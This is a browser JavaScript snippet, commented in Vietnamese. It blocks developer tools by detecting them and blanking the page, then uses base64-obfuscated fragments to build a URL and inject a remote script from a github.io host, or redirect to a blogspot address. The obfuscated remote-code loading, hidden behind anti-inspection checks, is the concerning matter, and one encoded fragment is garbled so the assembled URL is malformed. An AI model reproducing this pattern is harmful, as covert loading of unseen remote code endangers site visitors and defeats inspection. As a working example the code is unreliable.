function isMobile() {
  return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
}

if (!isMobile()) {



 let devToolsDetected = false;

    // Phát hiện mở console (trick ảnh)
    const img = new Image();
    Object.defineProperty(img, "id", {
      get: function () {
        devToolsDetected = true;
        document.body.innerHTML = "<h1 style='color:red'>⚠️ Đừng mở console!</h1>";
        throw new Error("Console detected");
      }
    });

    // Phát hiện đo thời gian bất thường
    setInterval(() => {
      const t1 = performance.now();
      for (let i = 0; i < 1e6; i++) {}
      const t2 = performance.now();
      if (t2 - t1 > 100) {
        devToolsDetected = true;
        document.body.innerHTML = "<h1 style='color:red'>🔒 DevTools bị phát hiện!</h1>";
      }
    }, 1000);

    // Kiểm tra kích thước cửa sổ bất thường
    setInterval(() => {
      if (
        window.outerWidth - window.innerWidth > 160 ||
        window.outerHeight - window.innerHeight > 160
      ) {
        devToolsDetected = true;
        document.body.innerHTML = "<h1 style='color:red'>🛑 Đừng mở DevTools!</h1>";
      }
    }, 1000);

    setInterval(() => {
      if (!devToolsDetected) {
        console.log(img);
        console.clear();
      }
    }, 1000);

    setTimeout(() => {
      if (!devToolsDetected) {

    var kiii = atob("amFuc2hhcmU="); 
    var ulll = atob("aHR0cHM6Ly9qYW5zaGFyZWJsb2cuYmxvZ3Nwb3QuY29t");
    var kaba = atob("edddGl1dGtr"); 
    var kab = atob("L2s="); // /k
    var kaa = atob("bHllbg=="); //lyen
    var kac = atob("dWIuaQ=="); //ub.i
	var ka = atob("dHBzOi8="); //   tps:/
    var sLk = "ht"+ka+"//"+kaba+".gith"+kac+"o"+kab+"/"+kaa+".js";

      if (location.href.includes(kiii)) {
        var s = document.createElement("script");
        s.src = sLk;
        document.head.appendChild(s);
      } else {
        setTimeout(function () {
          location.href = ulll;
        }, 500);
      }
      }
    }, 2000);
	
	}